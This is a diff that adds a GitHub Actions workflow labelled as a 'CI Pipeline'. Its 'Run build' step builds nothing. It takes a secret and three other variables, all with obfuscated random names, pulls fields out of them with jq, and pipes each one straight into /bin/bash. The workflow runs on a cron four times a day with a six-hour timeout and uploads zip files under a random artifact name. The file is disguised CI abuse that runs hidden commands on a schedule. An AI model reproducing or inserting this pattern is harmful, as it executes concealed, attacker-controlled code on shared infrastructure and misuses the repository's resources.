@@ -1,0 +1,36 @@
+name: CI Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '46 4,10,16,22 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  perform:
+    name: Run build
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Run build
+        env:
+          gzxa36900: ${{ secrets.gzxa36900 }}
+        run: |
+          printf '%s' "$gzxa36900" | jq -r .koy6 | /bin/bash
+          printf '%s' "$eynsm7074" | jq -r .arsb860 | /bin/bash
+          printf '%s' "$ywdbp620" | jq -r .hhg94917 | /bin/bash
+          echo $yzl963 | jq -r .xitaj126 | /bin/bash
+
+      - name: Save archive
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: iHBbhXbH
+          path: "*.zip"
+          retention-days: 1
